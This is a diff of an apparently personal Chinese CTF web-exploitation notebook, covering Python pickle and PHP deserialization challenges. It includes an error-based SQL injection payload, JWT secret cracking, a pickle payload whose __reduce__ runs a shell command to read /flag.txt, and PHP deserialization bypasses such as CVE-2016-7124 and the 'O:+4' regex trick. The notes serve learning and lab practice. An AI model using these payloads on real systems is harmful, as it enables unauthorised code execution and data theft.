@@ -259,117 +259,16 @@
 
     `1'or(extractvalue(1,concat(0x7e,(select(password)from(H4rDsq1)where(password)regexp('^f')),0x7e)))#`
 
-## 反序列化
-
-### python反序列化
-
-#### CISCN2019华北赛区 Day1 Web2 ikun(JWT python反序列化)
-
-1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑
-
-    ```python
-    url = 'http://4a471f3e-6f7e-46ab-a7b3-0dec29398943.node5.buuoj.cn:81/shop?page='
-    for i in range(600):
-        urls = url + str(i)
-        res = requests.get(urls)
-        if 'lv6.png' in res.text:
-            print('lv6 in ' + str(i) +' page\n')
-            break
-    ```
-
-2. lv6在181页，注册账号购买，钱不够，bp抓包，发现有折扣信息，修改折扣
-3. 进入一个新的页面`/b1g_m4mber`,提示只能由admin访问，抓包发现请求头里面有JWT(JSON Web Token,用于身份认证)，用`c-jwt-cracker`破解密钥
-    ```bash
-    ./jwtcrack 密文
-    ```
-
-    得到密钥后，需要生成新的jwt，这时可以用brup的JSON Web Token(修改JWT之后，会自动修改抓取数据包中的JWT),将用户名改为admin，放行，成功访问，查看网页源码发现了压缩包
-
-4. 题目一开始也提示了python 和 pickle，即python的反序列化漏洞，
-   
-   关于pickle
-
-    ```text
-    1. 持续化模块：就是让数据持久化保存。
-
-    pickle模块是Python专用的持久化模块，可以持久化包括自定义类在内的各种数据，比较适合Python本身复杂数据的存贮。
-    但是持久化后的字串是不可认读的，并且只能用于Python环境，不能用作与其它语言进行数据交换。
-
-    2. pickle 模块的作用
-
-    把 Python 对象直接保存到文件里，而不需要先把它们转化为字符串再保存，也不需要用底层的文件访问操作，直接把它们写入到一个二进制文件里。pickle 模块会创建一个 Python 语言专用的二进制格式，不需要使用者考虑任何文件细节，它会帮你完成读写对象操作。用pickle比你打开文件、转换数据格式并写入这样的操作要节省不少代码行。
-
-    3. 主要方法
-    在pickle中dumps()和loads()操作的是bytes类型，而在使用dump()和lload()读写文件时，要使用rb或wb模式，也就是只接收bytes类型的数据。
-    dumps(): 写
-    loads(): 读
-    loads() 和 dumps() 操作对象都是string
-    load() 和 dump() 操作对象都是文件
-    ```
-
-    漏洞在admin.py文件中。
-
-    ```python
-    import tornado.web
-    from sshop.base import BaseHandler
-    import pickle
-    import urllib
-
-
-    class AdminHandler(BaseHandler):
-        @tornado.web.authenticated
-        def get(self, *args, **kwargs):
-            if self.current_user == "admin":
-                return self.render('form.html', res='This is Black Technology!', member=0)
-            else:
-                return self.render('no_ass.html')
-
-        @tornado.web.authenticated
-        def post(self, *args, **kwargs):
-            try:
-                become = self.get_argument('become')
-                p = pickle.loads(urllib.unquote(become))
-                return self.render('form.html', res=p, member=1)
-            except:
-                return self.render('form.html', res='This is Black Technology!', member=0)
-    ```
-
-    借用别人的wp：
-    
-    思路是我们构建一个类，类里面的`__reduce__`魔术方法会在该类被反序列化的时候会被调用,而在`__reduce__`方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码.
-
-    破解脚本。
-
-    ```python
-    import pickle
-    import urllib
-    import commands
-    
-    
-    class payload(object):
-        def __reduce__(self):
-            return (commands.getoutput,('cat /flag.txt',))
-            # return(commands.getoutput,('ls /'))
-            # return (eval, ("open('/flag.txt','r').read()",))
-    
-    
-    a = pickle.dumps(payload())
-    a = urllib.quote(a)
-    print(a)
-    ```
-
-    得到payload后，利用bp修改become的值为payload
-
-    *注意 : 每次发送请求都要将jwt中的username改为admin*
+## PHP反序列化
 
 1. php知识了解
 
     - PHP访问修饰符
         - public 公共的 任何成员都可以访问
         - private 私有的 只有自己可以访问
-        绕过方式：%00类名%00成员名
+            - 序列化后会在变量名前加上`\x00类名\x00`
         - protected 保护的 只有当前类的成员与继承该类的类才能访问
-        绕过方式：%00%00成员名
+            - 序列化后会在变量名前加上`\x00*\x00`
 
     - PHP类
         - class 创建类
@@ -389,25 +288,71 @@
         - ord 用于返回 “S” 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串
 
     - PHP魔法函数
-        1. __wakeup() 在进行unserialize反序列化的时候，首先查看有无该函数有的话就会先执行他
+        ```php
+        __wakeup() //在进行unserialize反序列化的时候，首先查看有无该函数有的话就会先执行他
+        __sleep() //serialize之前被调用。若对象比较大，想删减一点再序列化，可考虑一下此函数。
+        __destruct() //当删除一个对象或对象操作终止时被调用
+        __call()  //对象调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用__call函数。
+        __callStatic() //在静态上下文中调用不可访问的方法时触发
+        __construct()  //实例化对象时被调用， 当__construct和以类名为函数名的函数同时存在时，__construct将被调用，另一个不被调用。  
+        __get() //读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用__get函数。 
+        __set() //设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用_set函数。
+        __isset() //在不可访问的属性上调用isset()或empty()触发
+        __unset() //在不可访问的属性上使用unset()时触发
+        __autoload() //实例化一个对象时，如果对应的类不存在，则该方法被调用。
+        __toString() //把类当作字符串使用时触发
+        __invoke() //当尝试将对象调用为函数时触发
+        ```
+    - 反序列化绕过Tips
 
-            绕过方法：在序列化的时候增加对象属性个数，如：
+        1. php7.1+反序列化对类属性不敏感
+
+            我们前面说了如果变量前是protected，序列化结果会在变量名前加上`\x00*\x00`
+
+            但在特定版本7.1以上则对于类属性不敏感，即使没有`\x00*\x00`也依然会正常解析，比如[网鼎杯2019青龙组](#网鼎杯2020-青龙组-反序列化)这道题
+
+        2. 绕过__wakeup(CVE-2016-7124)
+   
+            ```php
+            版本：
+            ​ PHP5 < 5.6.25
+            ​ PHP7 < 7.0.10
+            ```
+            利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
+
+        3. 绕过部分正则
+
+            preg_match('/^O:\d+/')匹配序列化字符串是否是对象字符串开头
+
+            - 利用加号绕过（注意在url里传参时+要编码为%2B）
+            - serialize(array(a)); a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)
 
             ```php
-                O:4:"xctf":1:{s:4:"flag";s:4:"flag";}
-                变为
-                O:4:"xctf":2:{s:4:"flag";s:4:"flag";}
+            $a = 'O:4:"test":1:{s:1:"a";s:3:"abc";}';
+            // +号绕过
+            $b = str_replace('O:4','O:+4', $a);
+            unserialize(match($b));
+            // serialize(array($a));
+            unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
             ```
 
-        2. __destruct() 当删除一个对象或对象操作终止时被调用
-        3. __construct()  实例化对象时被调用， 当_construct和以类名为函数名的函数同时存在时，_construct将被调用，另一个不被调用。 
-        4. __call()  对象调用某个方法， 若方法存在，则直接调用；若不存在，则会去调用_call函数。 
-        5. __get() 读取一个对象的属性时，若属性存在，则直接返回属性值； 若不存在，则会调用_get函数。 
-        6. __set() 设置一个对象的属性时， 若属性存在，则直接赋值；若不存在，则会调用_set函数。
-        7. __toString() 打印一个对象的时被调用。如echo obj;或printobj; 
-        8. __sleep() serialize之前被调用。若对象比较大，想删减一点再序列化，可考虑一下此函数。 
-        9. __wakeup() unserialize时被调用，做些对象的初始化工作。
-        10. __autoload() 实例化一个对象时，如果对应的类不存在，则该方法被调用。
+        4. 利用引用
+
+            ```php
+            $this->a = 'abc';
+            $this->b= &$this->a;
+            ```
+
+            上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等
+
+        5. 16进制绕过字符的过滤
+
+            ```php
+            O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
+            //可以写成
+            O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
+            //表示字符类型的s大写时，会被当成16进制解析。
+            ```
 
 ### php类型一--字符串逃逸
 
@@ -1120,6 +1065,107 @@ so:
         ($b->str)->p=new Modifier();
         echo urlencode(serialize($a));
     ```
+
+## python反序列化
+
+### CISCN2019华北赛区 Day1 Web2 ikun(JWT python反序列化)
+
+1. 进来看到提示购买lv6，直接翻页找不到,翻页时发现url里有页面索引,直接脚本跑
+
+    ```python
+    url = 'http://4a471f3e-6f7e-46ab-a7b3-0dec29398943.node5.buuoj.cn:81/shop?page='
+    for i in range(600):
+        urls = url + str(i)
+        res = requests.get(urls)
+        if 'lv6.png' in res.text:
+            print('lv6 in ' + str(i) +' page\n')
+            break
+    ```
+
+2. lv6在181页，注册账号购买，钱不够，bp抓包，发现有折扣信息，修改折扣
+3. 进入一个新的页面`/b1g_m4mber`,提示只能由admin访问，抓包发现请求头里面有JWT(JSON Web Token,用于身份认证)，用`c-jwt-cracker`破解密钥
+    ```bash
+    ./jwtcrack 密文
+    ```
+
+    得到密钥后，需要生成新的jwt，这时可以用brup的JSON Web Token(修改JWT之后，会自动修改抓取数据包中的JWT),将用户名改为admin，放行，成功访问，查看网页源码发现了压缩包
+
+4. 题目一开始也提示了python 和 pickle，即python的反序列化漏洞，
+   
+   关于pickle
+
+    ```text
+    1. 持续化模块：就是让数据持久化保存。
+
+    pickle模块是Python专用的持久化模块，可以持久化包括自定义类在内的各种数据，比较适合Python本身复杂数据的存贮。
+    但是持久化后的字串是不可认读的，并且只能用于Python环境，不能用作与其它语言进行数据交换。
+
+    2. pickle 模块的作用
+
+    把 Python 对象直接保存到文件里，而不需要先把它们转化为字符串再保存，也不需要用底层的文件访问操作，直接把它们写入到一个二进制文件里。pickle 模块会创建一个 Python 语言专用的二进制格式，不需要使用者考虑任何文件细节，它会帮你完成读写对象操作。用pickle比你打开文件、转换数据格式并写入这样的操作要节省不少代码行。
+
+    3. 主要方法
+    在pickle中dumps()和loads()操作的是bytes类型，而在使用dump()和lload()读写文件时，要使用rb或wb模式，也就是只接收bytes类型的数据。
+    dumps(): 写
+    loads(): 读
+    loads() 和 dumps() 操作对象都是string
+    load() 和 dump() 操作对象都是文件
+    ```
+
+    漏洞在admin.py文件中。
+
+    ```python
+    import tornado.web
+    from sshop.base import BaseHandler
+    import pickle
+    import urllib
+
+
+    class AdminHandler(BaseHandler):
+        @tornado.web.authenticated
+        def get(self, *args, **kwargs):
+            if self.current_user == "admin":
+                return self.render('form.html', res='This is Black Technology!', member=0)
+            else:
+                return self.render('no_ass.html')
+
+        @tornado.web.authenticated
+        def post(self, *args, **kwargs):
+            try:
+                become = self.get_argument('become')
+                p = pickle.loads(urllib.unquote(become))
+                return self.render('form.html', res=p, member=1)
+            except:
+                return self.render('form.html', res='This is Black Technology!', member=0)
+    ```
+
+    借用别人的wp：
+    
+    思路是我们构建一个类，类里面的`__reduce__`魔术方法会在该类被反序列化的时候会被调用,而在`__reduce__`方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码.
+
+    破解脚本。
+
+    ```python
+    import pickle
+    import urllib
+    import commands
+    
+    
+    class payload(object):
+        def __reduce__(self):
+            return (commands.getoutput,('cat /flag.txt',))
+            # return(commands.getoutput,('ls /'))
+            # return (eval, ("open('/flag.txt','r').read()",))
+    
+    
+    a = pickle.dumps(payload())
+    a = urllib.quote(a)
+    print(a)
+    ```
+
+    得到payload后，利用bp修改become的值为payload
+
+    *注意 : 每次发送请求都要将jwt中的username改为admin*
 
 ## SUCTF2019 CheckIn(文件上传漏洞)
 
